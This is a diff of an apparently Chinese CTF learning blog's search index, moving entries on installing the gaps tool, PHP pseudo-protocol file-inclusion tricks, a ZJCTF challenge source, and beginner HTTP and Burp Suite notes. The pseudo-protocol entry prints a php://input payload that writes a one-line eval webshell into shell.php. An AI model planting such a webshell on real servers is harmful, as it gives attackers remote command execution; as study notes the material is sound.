@@ -751,42 +751,6 @@
       </tags>
   </entry>
   <entry>
-    <title>gaps安装</title>
-    <url>/2023/01/07/gaps%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<p>看了很多教程最后花了几个小时装了下来，记录一下。</p>
-<span id="more"></span>
-
-<p>下载命令</p>
-<p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a> #gaps官网</p>
-<p>cd gaps</p>
-<p>pip install -r requirements.txt</p>
-<p>sudo apt-get install python-tk</p>
-<p>pip install -e .</p>
-<p>我的kali进不了github所以我在windows下将gaps包挪到了kali中。</p>
-<p>命令行中输入gaps即可在kali中下载。</p>
-<p>下载后使用命令</p>
-<p>sudo apt-get install python3-pillow</p>
-<p>sudo apt-get install python3-numpy</p>
-<p>sudo apt-get install python3-opencv-python </p>
-<p>sudo apt-get install python3-pytest</p>
-<p>sudo apt-get install python3-matplotlib</p>
-<p>然后查看requirements.txt</p>
-<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417498906-713dabb9-3fbd-4540-880d-815a3c3aa501.png" alt="img"></p>
-<p>对应的各自版本号，不同则修改</p>
-<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417561551-f1c02b9e-7de4-4d1c-8416-4ff674cc220d.png" alt="img"></p>
-<p>括号内的就是版本号</p>
-<p>最后使用命令pip3 install -e .</p>
-<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417638964-4c8641f7-0894-4e6c-bfa4-e3da6cc51f75.png" alt="img"></p>
-<p>出现以上内容安装成功。</p>
-]]></content>
-      <categories>
-        <category>ctf工具</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
     <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
     <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
@@ -854,6 +818,42 @@
       </categories>
       <tags>
         <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gaps安装</title>
+    <url>/2023/01/07/gaps%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<p>看了很多教程最后花了几个小时装了下来，记录一下。</p>
+<span id="more"></span>
+
+<p>下载命令</p>
+<p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a> #gaps官网</p>
+<p>cd gaps</p>
+<p>pip install -r requirements.txt</p>
+<p>sudo apt-get install python-tk</p>
+<p>pip install -e .</p>
+<p>我的kali进不了github所以我在windows下将gaps包挪到了kali中。</p>
+<p>命令行中输入gaps即可在kali中下载。</p>
+<p>下载后使用命令</p>
+<p>sudo apt-get install python3-pillow</p>
+<p>sudo apt-get install python3-numpy</p>
+<p>sudo apt-get install python3-opencv-python </p>
+<p>sudo apt-get install python3-pytest</p>
+<p>sudo apt-get install python3-matplotlib</p>
+<p>然后查看requirements.txt</p>
+<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417498906-713dabb9-3fbd-4540-880d-815a3c3aa501.png" alt="img"></p>
+<p>对应的各自版本号，不同则修改</p>
+<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417561551-f1c02b9e-7de4-4d1c-8416-4ff674cc220d.png" alt="img"></p>
+<p>括号内的就是版本号</p>
+<p>最后使用命令pip3 install -e .</p>
+<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417638964-4c8641f7-0894-4e6c-bfa4-e3da6cc51f75.png" alt="img"></p>
+<p>出现以上内容安装成功。</p>
+]]></content>
+      <categories>
+        <category>ctf工具</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1037,6 +1037,30 @@
       </tags>
   </entry>
   <entry>
+    <title>php伪协议</title>
+    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
+<span id="more"></span>
+
+<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
+<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
+<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
+<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
+<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(php伪协议/反序列化)[ZJCTF 2019]NiZhuanSiWei</title>
     <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/</url>
     <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;&lt;</span><br></pre></td></tr></table></figure>
@@ -1071,30 +1095,6 @@
 ]]></content>
       <categories>
         <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议</title>
-    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
-<span id="more"></span>
-
-<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
-<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
-<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
-<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
-<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
-<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1165,6 +1165,21 @@ print(serialize($name));
       </tags>
   </entry>
   <entry>
+    <title>windows与linux敏感文件</title>
+    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(.user.ini+GIF89a+script一句话木马)[SUCTF 2019]CheckIn</title>
     <url>/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/</url>
     <content><![CDATA[<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711680046-9b221109-2797-4f54-b053-1be9a4ffe473.png" alt="img"></p>
@@ -1228,21 +1243,6 @@ https://blog.csdn.net/weixin_39190897/article/details/86772765
 https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       <categories>
         <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>windows与linux敏感文件</title>
-    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1953,161 +1953,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>网安基础总结三</title>
-    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
-<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
-<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
-<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
-<span id="more"></span>
-
-<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
-<p>然后输入命令</p>
-<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
-<p>如</p>
-<p>certutil -hashfile  webpro.war MD5</p>
-<p>注意后面有个MD5,不然会生成一个其他的值。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结二</title>
-    <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
-    <content><![CDATA[<p><strong>本周重点</strong></p>
-<p><strong>1.学习进展</strong></p>
-<p>1.完成burpsuite的安装以及java环境的配置。</p>
-<p>2.完成对http协议的学习以及对url，web前端的一些浅显的了解。</p>
-<p>3.了解了公网ip和内网ip的区别.</p>
-<span id="more"></span>
-
-<p><strong>2.遗留问题</strong></p>
-<p>​        <strong>1.内网IP与公网IP的联系和区别是什么。内网IP是不是有很多，而公网IP只有几个或者是某些内网IP连接一个公网IP。</strong></p>
-<p>​         <strong>2.自己电脑上设置的IP地址会不会与别人的IP地址想冲突，导致自己上不了网。</strong></p>
-<p><strong>3.下周计划</strong></p>
-<p>1.学习数据库基础</p>
-<p>2.学习SQL基础</p>
-<p>3.学习MySQL部署与使用</p>
-<p><strong>4.思考总结</strong></p>
-<p>​         <strong>首先总结一下burpsuite的安装与Java环境的配置！</strong></p>
-<p><strong>1.首先找到系统设置中的高级系统设置，点击环境变量。</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062708-feae412f-7908-4f68-ba33-568ff1651b65.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062309-ab8cf4dd-78dc-42d6-8c55-a47e3cedadfa.gif" alt="img"></p>
-<p><strong>2.找到系统变量path设置</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062542-7e15a7f3-0076-4b0f-8c92-1ca5a60fa4f6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062311-b40a5d85-b7bc-497d-953d-f3efb211d2ed.gif" alt="img"></p>
-<p><strong>3.点击并编辑两条新的文本</strong></p>
-<p>%JAVA_HOME%\bin %JAVA_HOME%\jre\bin</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062302-c19e5f59-de13-4cb6-8981-8291facc8652.gif" alt="img"></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062817-a06cd932-0656-4e3b-9bd1-ca7960eb396c.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062872-b4fb976d-c5fa-44da-9ffd-2791761c576f.gif" alt="img"></p>
-<p><strong>4.添加新的系统变量JAVA_HOME</strong></p>
-<p>变量值是jdk的安装路径。</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062938-cd99e78e-4be7-4026-91e8-552b03b1cee6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063259-9af407bf-8cf7-42ea-ba47-33d2ea98f103.gif" alt="img"></p>
-<p><strong>5.添加CLASSPATH这个新的系统变量</strong></p>
-<p>变量值是 </p>
-<p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063917-b33286fc-1178-46ab-b6dd-7acab372a840.gif" alt="img"></p>
-<p>切记，最前方有  .；</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366063982-e583a5d7-21c3-4073-8b27-fd7c18617131.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064047-80a7e79e-fc19-4e04-8db4-6f86203c3184.gif" alt="img"></p>
-<p><strong>6.配置完成后点击确定。</strong></p>
-<p><strong>7.在cmd命令中输入java -version和javac -version</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366064353-75e1c6b8-34aa-4ca2-974f-7cd94ea171a2.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064407-b4ff7bdc-d542-42f5-b1da-6eba6d7c0c4b.gif" alt="img"></p>
-<p>若出现版本号，则Java环境配置成功。</p>
-<p>后面的burpsuite安装过程很简单，这里不细讲。</p>
-<hr>
-<p>​                          <strong>第二，总结一下http协议</strong></p>
-<p><strong>Request请求数据包</strong></p>
-<p>HTTP规划定义了8种可能的请求方法:</p>
-<p>1 GET:检索URL中标识资源的一个简单请求</p>
-<p>2HEAD:与GET方法相同， 服务器只返回状态行和头标，并不返回请求文档</p>
-<p>3 POST: 服务器接受被写入客户端输出流中的数据的请求</p>
-<p>4PUT:服务器保存请求数据作为指定URI新内容的请求</p>
-<p>5DELETE:服务器删除URL中命令的资源的请求</p>
-<p>6OPTIONS:关于服务器支持的请求方法信息的请求</p>
-<p>7 TRACE: web服务器反馈Http请求和其头标的请求</p>
-<p>8 CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理</p>
-<p>例如：</p>
-<p>请求行     GET /index.html HTTP/1.1</p>
-<p>请求方法：GET    请求url：index.html   HTTP版本：HTTP/1.1</p>
-<p>​                                                                                                       <strong>划重点！！！</strong></p>
-<p><strong>下面用chrome浏览器对某一网页进行检查</strong></p>
-<p>我们随便进入一个网页如下图</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366519046-3e22d4cb-35a5-43a4-8fff-bb784d430c7d.png" alt="img"></p>
-<p>然后点击network</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366577455-cf0bf193-ab72-4cf7-b541-79a51ecd6e63.png" alt="img"></p>
-<p>按住ctrl+r</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366610192-8c8d1065-d648-4a5c-9db6-ccae8fdc9937.png" alt="img"></p>
-<p>就可以得到这一网站里的内容，<strong>这就类似于burp suite的抓包</strong></p>
-<p><strong>我们看一下请求数据包request header</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366748992-dd527888-897e-48e3-8fd8-67789024a49d.png" alt="img"></p>
-<p>可以清楚的看到，他的请求数据包里的<strong>请求行</strong>是GET————一直到HTTP/1.1</p>
-<p>GET后的一大串内容则是检索URL中的标识资源。</p>
-<p><em><strong>我们说一下url的组成</strong></em></p>
-<p>URL简单来说就是输入地址栏里的一大串网址，按此网页的地址栏内的网址为例<a href="https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG">https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG</a></p>
-<p> 第一部分是url方案，方案可以告知web客户端要怎么访问资源。这里是https://，也就是https协议。常见的还有http、ftp等。<br>第二部分指定服务器的位置，这部分告知web客户端资源的位置。例子中是ayitsec.yuque.com<br>第三部分是资源路径，路径说明了资源在服务器的位置。也即是例子中的</p>
-<p>staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG  </p>
-<p><strong>我的理解：</strong></p>
-<p><strong>1.请求行下面的都是请求头，其中HOST请求头里面的内容则是url中的第二部分——指定服务器位置</strong></p>
-<p> <strong>2.我们说的http协议有八种请求方法，其中最常用的两种请求方法是get与post。</strong></p>
-<p> <strong>3.GET请求把参数放在url中，POST请求通过request body传递参数（也就是空行下的那一行）。而且GET请求对url中传送的参数有长度限制，而POST 则没有长度限制。</strong></p>
-<p> <strong>4.GET请求里，请求行中‘？’分割实际的url和参数，‘&amp;’是url指定的参数间的分隔符。所以，我们的例子中的参数就是</strong>toc_node_uuid=w9bQEpfPpVSSY8SG               </p>
-<p>请求头：</p>
-<p>1.HOST：主机或域名地址。对应网址URL中的Web名称和端口号。</p>
-<p>2.Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。</p>
-<p>3.User-Agent: 是客户浏览器名称</p>
-<p>4.Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us， 指英语。</p>
-<p>5.connection: 用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值， 这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接。（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点。</p>
-<p>6 Cookie: 浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</p>
-<p>7 Referer: 表明产生请求的网页URL。 如比从网页/ icconcept/ index. jsp中点击一个链接到网页/icwork/ search，在向服务器发送的GET/icwork/ search中的请求中，Referer是<a href="http://hostname:8080/icconcept">http://hostname:8080/icconcept</a> /index.jsp.</p>
-<p>8 Content-Type: 用来表名request的内容类型。可以用HttpServletRequest的getContentType ()方法取得。</p>
-<p>9 Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是IS0-8859-1.</p>
-<p>10 Accept-Encoding: 指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式。</p>
-<p>空行</p>
-<p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p>
-<p>请求数据</p>
-<p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
-<p><strong>Response返回数据包数据格式</strong></p>
-<p>1.状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔</p>
-<p>2.响应头标:包含服务器类型、日期、长度、内容类型等</p>
-<p>3.空行:响应头与响应体之间用空行隔开</p>
-<p>4.响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面</p>
-<p>HTTP响应码:</p>
-<p>1xx: 信息，请求收到，继续处理</p>
-<p>2xx: 成功，行为被成功地接受、理解和采纳</p>
-<p>3xx: 重定向，为了完成请求，必须进一步执行的动作</p>
-<p>4xx:客户端错误</p>
-<p>5xx:服务器错误</p>
-<p>200 存在文件</p>
-<p>403 存在文件夹</p>
-<p>3xx 均可能存在</p>
-<p>404 不存在文件及文件夹</p>
-<p>500 均可能存在</p>
-<hr>
-<p>​                             <em><strong>第三.内网ip和公网ip</strong></em></p>
-<p>内网ip：路由器以内的网络。可以连接互联网，但是互联网无法直接连接内网（需要端口映射）</p>
-<p>公网IP：互联网IP地址。</p>
-<p>IP地址就像家庭地址一样，公网IP是小区地址，小区中又有很多住户，内网ip就像你家具体的门牌号，你可以从小区里出去（内网ip能连接到互联网），但是外人进入你家需要进行验证（公网IP无法直接连接到内网ip）<br>具体操作<br>用邮寄系统作比喻。有公网ip，相当于说你有一个详细的地址，你可以写信寄给别人，别人也可以用这个地址和你进行各种通讯。<br>来看看没有公网ip是一种什么局面。这就像是住在一个大院里 ，所有进出邮件都由传达室转交。如果是普通的邮件，可以放在传达室，传达室的大爷大妈看到你了就会转交给你，或者你自己去传达室看看，这不重要，反正虽然经过了一点波折，还是可以看到邮件的。假设以下如果来了个挂号，邮局的人员说：必须本人签收。传达室的大爷就说了：对不起，所有的邮件都要经过我中转~。于是邮局的人员只好把信带回去了……<br>实际情况和这个差不多，所谓没有公网ip，就是说你的机子并非直接连接上internet，而是所有通讯经过一台代理（一般是透明网关）进行中转，这时候问题就来了，就会有一些通讯无法在这种机制下顺利进行。比如两个网吧之间，网吧的机子是没有公网 ip的典型例子，通常两个网吧之间通过QQ传送文件就不是直接两台机器建立连接传输的，而是通过QQ的公网服务器进行中转传输了。又比如没有公网ip，上网玩对战游戏通常会有问题，你建立的游戏别人无法加入等等，当然通过服务提供商的公网服务器中转还是可以达成两个没有公网IP的机器进行交流的。</p>
-<hr>
-<p>​       <strong>第四：使用burp suite时浏览器的代理设置。</strong></p>
-<p><strong>1.火狐浏览器安装插件</strong></p>
-<h1 id="FoxyProxy-标准版"><a href="#FoxyProxy-标准版" class="headerlink" title="FoxyProxy 标准版"></a>FoxyProxy 标准版</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370687313-39151ef7-4f02-4207-b095-7bc7f2a593f8.png" alt="img"></p>
-<p>2.Edge浏览器安装插件</p>
-<h1 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370760581-fdf5355f-64a6-4b92-afdc-51d4c5a7198a.png" alt="img"></p>
-<p>什么时候用就打开。</p>
-<ul>
-<li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安基础总结七</title>
     <url>/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/</url>
     <content><![CDATA[<h2 id="一、学习记录"><a href="#一、学习记录" class="headerlink" title="一、学习记录"></a>一、学习记录</h2><h3 id="1-1git泄露"><a href="#1-1git泄露" class="headerlink" title="1.1git泄露"></a>1.1git泄露</h3><p>既然题目提示了git泄露漏洞，那么直接下载源码</p>
@@ -2285,6 +2130,161 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>差不多就这些，以后再做补充。</p>
 <h2 id="三、下周计划"><a href="#三、下周计划" class="headerlink" title="三、下周计划"></a>三、下周计划</h2><p>下周主攻MISC，学一下python脚本编写。副攻web中的命令执行和php特性这类题目。</p>
 <p>加油(ง •_•)ง</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结三</title>
+    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
+<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
+<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
+<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
+<span id="more"></span>
+
+<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
+<p>然后输入命令</p>
